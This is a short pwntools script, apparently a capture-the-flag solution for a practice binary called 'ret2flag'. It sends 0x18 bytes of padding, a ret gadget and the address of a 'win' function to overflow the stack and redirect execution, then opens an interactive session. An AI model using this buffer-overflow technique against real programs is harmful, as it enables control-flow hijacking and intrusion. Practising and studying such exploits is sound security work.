import warnings

from pwn import *

warnings.filterwarnings("ignore", category=BytesWarning)
context.arch = "amd64"

host = "0.0.0.0"
port = 5017

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    r = remote(host, port)
else:
    r = process("./ret2flag")

win = 0x4011B7
ret = 0x401016
p = flat(b"a" * 0x18, ret, win)
# gdb.attach(r)
r.sendlineafter(b":", p)

r.interactive()
